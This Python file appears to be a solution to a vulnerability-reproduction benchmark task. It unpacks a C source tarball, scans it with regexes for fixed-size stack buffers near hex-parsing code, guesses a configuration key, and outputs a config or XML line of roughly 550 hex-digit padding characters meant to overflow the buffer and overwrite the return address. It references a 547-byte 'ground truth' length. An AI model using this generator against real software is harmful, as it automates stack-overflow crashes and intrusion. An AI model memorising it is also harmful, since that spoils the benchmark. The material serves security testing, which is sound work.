import os
import re
import tarfile
import tempfile
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Analyzes the source code to identify configuration keywords and stack buffer sizes
        associated with hex string parsing, then constructs a PoC config file.
        """
        extract_path = tempfile.mkdtemp()
        try:
            # Extract source code
            with tarfile.open(src_path) as tar:
                tar.extractall(path=extract_path)
            
            # Default fallback values
            best_keyword = "config"
            best_size = 512
            max_score = 0
            is_xml = False
            
            # Regex patterns for static analysis
            # Detect local stack buffers: char buf[1024];
            re_buf = re.compile(r'char\s+(\w+)\s*\[\s*(\d+)\s*\]')
            # Detect string literals which might be config keys
            re_str = re.compile(r'"([a-zA-Z0-9_-]+)"')
            # Detect hex parsing logic or indicators
            re_hex = re.compile(r'0x|isxdigit|sscanf.*%x|strtol.*16|strtoul')
            # Detect XML parsing context
            re_xml = re.compile(r'xml|Xml|XML|<')
            
            # Walk through source files
            for root, dirs, files in os.walk(extract_path):
                for file in files:
                    # Check filename for format hints
                    if "xml" in file.lower():
                        is_xml = True
                        
                    if file.endswith('.c') or file.endswith('.cpp') or file.endswith('.h'):
                        path = os.path.join(root, file)
                        try:
                            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                        except Exception:
                            continue
                        
                        # Check file content for XML hints
                        if re_xml.search(content):
                            is_xml = True
                        
                        # Find all stack buffer declarations in this file
                        buffers = {}
                        for m in re_buf.finditer(content):
                            name = m.group(1)
                            try:
                                size = int(m.group(2))
                                buffers[name] = size
                            except ValueError:
                                continue
                        
                        if not buffers:
                            continue
                        
                        # Analyze line by line with a context window
                        lines = content.splitlines()
                        for i, line in enumerate(lines):
                            # Look for lines related to hex processing
                            if re_hex.search(line):
                                # Define context window (e.g., +/- 30 lines)
                                ctx_start = max(0, i - 30)
                                ctx_end = min(len(lines), i + 30)
                                context = "\n".join(lines[ctx_start:ctx_end])
                                
                                # Check if any known buffer is used in this context
                                local_bufs_sizes = []
                                for bname, bsize in buffers.items():
                                    # Simple heuristic: variable name usage
                                    if re.search(r'\b' + re.escape(bname) + r'\b', context):
                                        local_bufs_sizes.append(bsize)
                                
                                if not local_bufs_sizes:
                                    continue
                                
                                # Assume the smallest buffer is the most likely target for overflow
                                current_size = min(local_bufs_sizes)
                                
                                # Find string literals in context (potential configuration keys)
                                candidates = []
                                for s in re_str.findall(context):
                                    # Filter out common short strings or format specifiers
                                    if len(s) > 2 and s not in ["0x", "%s", "%x", "rb", "wb", "Error", "error"]:
                                        candidates.append(s)
                                
                                # Score each candidate keyword
                                for key in candidates:
                                    score = 10
                                    # Higher score if keyword is used in a comparison (identifying the config option)
                                    if "strcmp" in context and key in context:
                                        score += 20
                                    elif "strcasecmp" in context and key in context:
                                        score += 20
                                        
                                    # Heuristic: 512 is a very common buffer size for this type of vulnerability
                                    # and matches the ground truth length hint (547 bytes) well.
                                    if current_size == 512:
                                        score += 15
                                    elif current_size == 256:
                                        score += 10
                                    elif current_size == 1024:
                                        score += 5
                                    
                                    if score > max_score:
                                        max_score = score
                                        best_keyword = key
                                        best_size = current_size

            # If static analysis didn't find a strong candidate, assume 'value' or generic
            if max_score == 0:
                best_keyword = "value"
            
            # Construct the payload
            # Ground truth is 547 bytes.
            # If the buffer is 512 bytes, we need to overflow it to overwrite RIP/EIP.
            # Usually ~20-40 bytes overflow is sufficient.
            # 512 (buffer) + 40 (overflow) = 552 bytes of hex data.
            # Plus "KEY = 0x" overhead (~10 bytes) -> ~562 bytes total.
            # This is very close to the ground truth of 547.
            
            # We pad with 'A' (hex 0x41 is 'A', but here we are sending a string of hex digits)
            # The vulnerability is "long hex values", usually implying a string copy of the digits
            # or a buffer overflow during binary conversion. Given 547 bytes, string copy is more likely
            # because binary conversion of 547 bytes input would only fill ~270 bytes buffer.
            
            padding_length = best_size + 40
            # Ensure we don't generate something too small if best_size was tiny
            if padding_length < 547:
                 padding_length = 550
                 
            hex_payload = "A" * padding_length
            
            if is_xml:
                # XML Format
                poc = f"<{best_keyword}>0x{hex_payload}</{best_keyword}>"
            else:
                # Standard Config Format: KEY = 0xVALUE
                # Used by many libs (libconfig, etc.) and custom parsers
                poc = f"{best_keyword} = 0x{hex_payload}\n"
            
            return poc.encode('utf-8')

        except Exception:
            # Fail-safe payload
            return b"config = 0x" + (b"A" * 600)
        finally:
            if os.path.exists(extract_path):
                shutil.rmtree(extract_path)